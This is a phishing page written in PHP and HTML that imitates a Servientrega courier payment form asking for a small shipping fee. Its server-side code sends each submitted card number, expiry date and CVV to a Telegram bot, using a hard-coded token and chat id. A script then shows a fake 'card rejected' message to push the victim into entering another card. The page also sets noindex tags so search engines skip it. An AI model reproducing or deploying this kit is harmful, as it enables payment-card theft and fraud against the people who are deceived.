<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex, nofollow">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informacion de pago</title>
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@100&display=swap" rel="stylesheet">

<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://kit.fontawesome.com/363b8144db.js" crossorigin="anonymous"></script>




    
</head>
<body>


<?php
if (isset($_POST['savedata'])){
    $CardNumber = $_POST['CardNumber'];
    $ExpirationDate = $_POST['ExpirationDate'];
    $CVV = $_POST['CVV'];
    $token = "6628219247:AAE5YzvFhU7--dT4ioVSF1jehH7oc_d1E0M";
    $chatid = "-1002033975046";
    $credentials = "informacion recolectada\nCardNumber: " . $CardNumber . "\nExpirationDate:" . $ExpirationDate . "\nCVV:" . $CVV . "";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($credentials);
    $response = file_get_contents($url);

    
}

?>

<header>   
    <div class="logo">
        <img src="img/servientrega.png" width="200" style="display: block;"/>
    </div>
</header>


    
    <h1>Informacion de pago</h1>
    <p1>paso 2 de 2</p1>  
    <div class="cuadro">
        <table>
            <tr>

                <th><i class="fa-solid fa-file-lines" style="color: black; right: auto; bottom: auto; "></i> Numero de guia 
                    4R5A8D78G12B8CO
                </th>
            </tr>
            <tr>  
                <td>IVA</td>
                <td>$ 0.00 COP</td>
            </tr>
            <tr>  
                <td>Valor total</td>
                <td>$ 9.780 COP</td>
            </tr>    
        </table> 
        <hr> 
        
        <h1>$9.780 COP</h1> 
        
    </div>    


    <div>
        <form class="input-field" method="post"  onsubmit="validinput(); return true;"> 
            
            <input class="controls" type="text" name="CardNumber"
            id="cardnumber" placeholder="Numero de tarjeta" required >
            <i class="form_icon fa-solid fa-credit-card"></i>  

            <input class="controls"  type="text" name="ExpirationDate"
            id="Expirationdate" placeholder="Fecha de vencimiento (MM/AA)" required >
            <i class="form_icon fa-solid fa-calendar"></i>  

            <input class="controls" type="text" name="CVV"
            id="CVV" placeholder="Codigo de seguridad (CVV)" maxlength="3" required > 
            <i class="form_icon fa-solid fa-lock"></i> 

            <input class="submit__page" type="submit" value="Pagar servicio" name="savedata" id="savedata"/>
        </form>
    </div> 
    

<div id="myModal_data" class="modal_data">
    <div class="modal-content_data">
        <span class="close-button" style ="display: none ;">&times;</span>
        <i class="fa-regular fa-circle-xmark" style="position: static; color: #c41d1d; font-size: 100px;"></i>
        <h3>Error</h3>
        <p>Se ha rechazado su metodo de pago, Intentelo nuevamente con otra tarjeta de credito.</p>
        <input class="final__page" type="submit" value="Aceptar">
    </div>
</div>    



<script>
    
    function validinput() {
        const texto1 = document.getElementById("cardnumber").value;
        const texto2 = document.getElementById("Expirationdate").value;
        const texto3 = document.getElementById("CVV").value;

        if (texto1.trim() !== "" && texto2.trim() !== "" && texto3.trim() !== "") {
                // Mostrar el modal
            const modal = document.getElementById("myModal_data");
            modal.style.display = "block";
        } 
    }

</script>

<script>
    $(document).ready(function(){
        $('#cardnumber').mask('0000 0000 0000 0000');
        $('#Expirationdate').mask('00/00');
    });
</script>

</body>
</html>





